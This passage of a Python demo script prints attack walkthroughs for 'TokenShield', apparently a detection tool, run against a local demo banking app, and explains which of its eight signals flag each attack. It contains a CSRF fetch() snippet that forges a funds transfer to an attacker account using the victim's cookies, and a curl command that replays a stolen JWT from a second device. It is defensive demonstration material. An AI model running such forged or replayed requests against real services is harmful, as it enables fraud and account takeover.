  ──────────────────────────────────────────────────────────────────────────
  // Simulates the evil.io script running in Alice's browser
  fetch('http://{lan_ip}:5001/api/accounts/transfer', {{
    method: 'POST',
    credentials: 'include',           // sends session cookies
    headers: {{'Content-Type': 'application/json'}},
    body: JSON.stringify({{
      amount: 9999,
      to_account: 'attacker_account'
    }})
  }}).then(r => r.json()).then(d => console.log('CSRF result:', d))
  ──────────────────────────────────────────────────────────────────────────
{GREEN}  What TokenShield detects:{RESET}
    Signal 5 (behavioral_biometrics): No X-TS-Biometrics header (script has none)
    Signal 7 (endpoint_risk): /transfer is a high-risk endpoint (0.40)
    Signal 8 (sequential_behavior): No prior navigation to /accounts first
    Origin header mismatch also flagged by NeoVault CORS policy
    Combined: score elevated → CHALLENGE or BLOCK
{DIM}""")

    pause("Press Enter to see Attack G — Account Takeover via Token Replay…")

    # ── Token Replay ──────────────────────────────────────────────────────────
    banner("ATTACK G — Account Takeover: JWT Token Replay from Second Device", RED)
    print(f"""
{DIM}  What it is:{RESET}  Alice's JWT is intercepted (via MitM, shoulder-surfing DevTools,
{DIM}              {RESET}  malware, or a leaked log). Attacker replays it from their own device.

{YELLOW}  HOW TO DEMONSTRATE — use your phone/second laptop:{RESET}
  ──────────────────────────────────────────────────────────────────────────
  Alice's current token:
  {alice_token}

  Make this request FROM YOUR PHONE (not the MacBook):

    curl http://{lan_ip}:5001/api/accounts \\
         -H "Authorization: Bearer {alice_token}"

  Or in RapidAPI / Postman:
    GET http://{lan_ip}:5001/api/accounts
    Header → Authorization: Bearer {alice_token}
  ──────────────────────────────────────────────────────────────────────────
{GREEN}  What TokenShield detects:{RESET}
    Signal 3 (session_consistency) = 0.90
    Reason: "ip_changed:127.0.0.1→<your_phone_ip>"
    Action: BLOCK instantly
    Alice's token is blacklisted, incident created, SSE push to dashboard
    Dashboard shows the exact attacker IP and path attempted
{DIM}""")

    print(f"""
{CYAN}{BOLD}
  ╔══════════════════════════════════════════════════════════════════════════╗
  ║  ATTACK DETECTION SUMMARY                                               ║
  ╠══════════════════════════════════════════════════════════════════════════╣
  ║  Attack A  XSS payload           → Signal 4  (payload_analysis  0.80)  ║
  ║  Attack B  Phishing / credential → Signal 3+5+8 combined               ║
  ║  Attack C  SQL injection         → Signal 4  (payload_analysis  0.90)  ║
  ║  Attack D  Path traversal        → Signal 4  (payload_analysis  0.85)  ║
  ║  Attack E  Credential stuffing   → Signal 2  (request_velocity)        ║
  ║  Attack F  CSRF forged request   → Signal 5+7+8 combined               ║
  ║  Attack G  JWT token replay      → Signal 3  (session_consistency 0.90)║
  ╠══════════════════════════════════════════════════════════════════════════╣
  ║  All incidents live at: http://{lan_ip}:7777/api/v1/incidents  ║
  ║  Live dashboard:        http://{lan_ip}:7777/dashboard          ║
  ╚══════════════════════════════════════════════════════════════════════════╝
{RESET}""")


# ─── Main ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    lan_ip = get_local_ip()

    print(f"""
{CYAN}{BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║         TOKENSHIELD  —  FULL 8-SIGNAL LIVE DEMONSTRATION                    ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  Signal 1: IP Reputation       (Tor / known-bad IPs)                        ║
║  Signal 2: Request Velocity    (bot burst detection)                         ║
║  Signal 3: Session Consistency (REAL token theft — second device)            ║
║  Signal 4: Payload Analysis    (SQLi, XSS, path traversal)                  ║
║  Signal 5: Behavioral Biometrics (typing, mouse, idle rhythm)                ║
║  Signal 6: Geographic Impossibility (impossible travel)                      ║
║  Signal 7: Sensitive Endpoint Risk (admin/transfer paths)                    ║
║  Signal 8: Sequential Behavior — LSTM Autoencoder                            ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  MacBook LAN IP: {lan_ip:<55} ║
╚══════════════════════════════════════════════════════════════════════════════╝
{RESET}""")

    preflight(lan_ip)
    pause("Pre-flight passed. Press Enter to begin…")

    # ── Phase 1 & 2: Alice logs in and warms up baseline
    alice_token = phase_login()
    time.sleep(0.3)
    phase_biometric_warmup(alice_token)

    pause("Baseline established. Press Enter → Demo all engine signals (S1, S2, S4, S5, S8)…")

    # ── Phase 3: Engine signal demonstrations (automated, controlled inputs)
    phase_engine_signals()

    # ── Phase 4: REAL attack from second device (S3 + S5 + S7)
    pause("Signals demonstrated. Press Enter → REAL second-device attack (S3 token hijack)…")
    phase_real_attack(alice_token, lan_ip)

    # ── Phase 5: Real-world cyber attack playbook
    pause("Press Enter → Real-World Cyber Attack Playbook (XSS, Phishing, SQLi, CSRF…)…")
    phase_attack_playbook(alice_token, lan_ip)

    # ── Phase 6: Stats
    phase_stats(lan_ip)

    banner("DEMONSTRATION COMPLETE ✅", GREEN)
    print(f"""
  {GREEN}{BOLD}All 8 signals demonstrated + 7 real-world attack vectors shown:{RESET}
  {GREEN}  ✓  S1  IP Reputation          — Tor exit node flagged (0.85){RESET}
  {GREEN}  ✓  S2  Request Velocity        — Bot burst / credential stuffing escalated{RESET}
  {GREEN}  ✓  S3  Session Consistency     — REAL token theft from second device detected{RESET}
  {GREEN}  ✓  S4  Payload Analysis        — SQL injection (0.90) · XSS (0.80) · Path traversal (0.85){RESET}
  {GREEN}  ✓  S5  Behavioral Biometrics   — Bot / phishing attacker profile vs. Alice (1.00){RESET}
  {GREEN}  ✓  S6  Geo Impossibility       — Impossible travel detected{RESET}
  {GREEN}  ✓  S7  Endpoint Risk           — Sensitive paths (transfer, admin) stacked{RESET}
  {GREEN}  ✓  S8  Sequential Behavior     — LSTM navigation anomaly · CSRF no-prior-nav{RESET}

  {CYAN}  Live dashboard: http://{lan_ip}:7777/dashboard{RESET}
  {CYAN}  All incidents:  http://{lan_ip}:7777/api/v1/incidents{RESET}
""")

